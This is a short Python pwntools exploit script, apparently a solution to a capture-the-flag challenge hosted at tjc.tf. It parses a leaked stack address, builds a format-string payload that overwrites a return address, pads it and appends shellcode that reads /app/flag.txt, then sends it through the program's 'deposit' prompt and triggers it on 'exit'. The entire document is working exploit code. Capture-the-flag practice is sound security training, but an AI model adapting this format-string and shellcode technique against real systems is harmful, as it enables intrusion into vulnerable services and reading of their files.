from pwn import *

# Set up pwntools for the correct binary
context.binary = "chall"
conn = remote("tjc.tf", 31363)
buf_leak = conn.recvline().decode()
buf_addr = int(buf_leak.split(",")[0], 16)
conn.recv()  # Clear any extra output

# Calculate the return address position
RET_OFFSET = 1048
ret_addr = buf_addr + RET_OFFSET

# Prepare shellcode and payload
shellcode = asm(shellcraft.cat("/app/flag.txt"))
SHELLCODE_OFFSET = 512

# Create the format string payload to overwrite the return address
fmt_payload = fmtstr_payload(12, {ret_addr: buf_addr + SHELLCODE_OFFSET})

# Pad the payload so the shellcode lands at the correct offset
padding = b"a" * (SHELLCODE_OFFSET - len(fmt_payload))
payload = fmt_payload + padding + shellcode

# Send the payload
conn.sendline(b"deposit")
conn.recvuntil(b"Enter amount: ")
conn.sendline(payload)
conn.recv()  # Clear any extra output

# Trigger the exploit
conn.sendline(b"exit")
print(conn.recvall().decode())